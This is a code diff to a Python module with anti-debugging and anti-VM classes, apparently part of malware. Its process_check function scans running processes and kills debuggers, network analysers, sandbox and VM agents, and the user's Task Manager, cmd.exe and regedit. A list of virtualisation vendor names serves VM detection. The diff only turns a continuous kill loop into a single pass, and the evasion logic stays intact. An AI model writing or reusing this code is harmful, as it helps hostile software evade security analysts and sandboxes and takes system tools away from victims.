@@ -23,49 +23,47 @@ class Antidbg:
             sys.exit()
 
     def process_check():
-        while True:
-            PROCESSES = [
-                "http toolkit.exe",
-                "httpdebuggerui.exe",
-                "wireshark.exe",
-                "fiddler.exe",
-                "charles.exe",
-                "regedit.exe",
-                "cmd.exe",
-                "taskmgr.exe",
-                "vboxservice.exe",
-                "df5serv.exe",
-                "processhacker.exe",
-                "vboxtray.exe",
-                "vmtoolsd.exe",
-                "vmwaretray.exe",
-                "ida64.exe",
-                "ollydbg.exe",
-                "pestudio.exe",
-                "vmwareuser",
-                "vgauthservice.exe",
-                "vmacthlp.exe",
-                "x96dbg.exe",
-                "vmsrvc.exe",
-                "x32dbg.exe",
-                "vmusrvc.exe",
-                "prl_cc.exe",
-                "prl_tools.exe",
-                "qemu-ga.exe",
-                "joeboxcontrol.exe",
-                "ksdumperclient.exe",
-                "ksdumper.exe",
-                "joeboxserver.exe",
-                "xenservice.exe",
-            ]
-            for proc in psutil.process_iter():
-                if any(procstr in proc.name().lower() for procstr in PROCESSES):
-                    try:
-                        proc.kill()
-                    except (psutil.NoSuchProcess, psutil.AccessDenied):
-                        pass
-            
-            time.sleep(2)
+        PROCESSES = [
+            "http toolkit.exe",
+            "httpdebuggerui.exe",
+            "wireshark.exe",
+            "fiddler.exe",
+            "charles.exe",
+            "regedit.exe",
+            "cmd.exe",
+            "taskmgr.exe",
+            "vboxservice.exe",
+            "df5serv.exe",
+            "processhacker.exe",
+            "vboxtray.exe",
+            "vmtoolsd.exe",
+            "vmwaretray.exe",
+            "ida64.exe",
+            "ollydbg.exe",
+            "pestudio.exe",
+            "vmwareuser",
+            "vgauthservice.exe",
+            "vmacthlp.exe",
+            "x96dbg.exe",
+            "vmsrvc.exe",
+            "x32dbg.exe",
+            "vmusrvc.exe",
+            "prl_cc.exe",
+            "prl_tools.exe",
+            "qemu-ga.exe",
+            "joeboxcontrol.exe",
+            "ksdumperclient.exe",
+            "ksdumper.exe",
+            "joeboxserver.exe",
+            "xenservice.exe",
+        ]
+        for proc in psutil.process_iter():
+            if any(procstr in proc.name().lower() for procstr in PROCESSES):
+                try:
+                    proc.kill()
+                except (psutil.NoSuchProcess, psutil.AccessDenied):
+                    pass
+        
 
 class Antivm:
     mac_vm=["Oracle", "Pcs Systemtechnik GmbH","VMWare","Microsoft","Parallels","VM","Virtual Machine","Super Micro Computer"]
